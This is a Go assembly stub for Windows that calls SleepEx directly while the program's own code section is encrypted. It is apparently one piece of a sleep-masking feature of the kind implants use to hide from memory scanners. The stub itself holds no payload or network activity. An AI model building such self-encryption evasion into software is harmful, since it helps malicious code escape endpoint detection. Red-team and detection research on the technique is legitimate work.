//go:build windows && amd64
#include "textflag.h"

// maskedSleepStub — call SleepEx(ms, FALSE) directly. No Go runtime
// function executes between entering and returning from this stub,
// so it is safe to call while .text is encrypted.
//
// Precondition: sleepExAddr is a valid pointer to kernel32!SleepEx,
// resolved before the encrypt. The Windows x64 ABI passes arg1 in
// RCX, arg2 in RDX.
//
// This file MUST be linked into the excluded region. The
// EncryptSelf range check uses runtime.FuncForPC to verify that
// maskedSleepStub's entry address is inside the excluded range; if
// it is not, EncryptSelf refuses to encrypt and returns an error
// rather than corrupting the process.
TEXT ·maskedSleepStub(SB), NOSPLIT, $0-16
    MOVQ sleepExAddr+0(FP), AX
    MOVL ms+8(FP), CX       // 32-bit load, zero-extended (DWORD arg)
    XORQ DX, DX             // bAlertable = FALSE
    CALL AX
    RET
    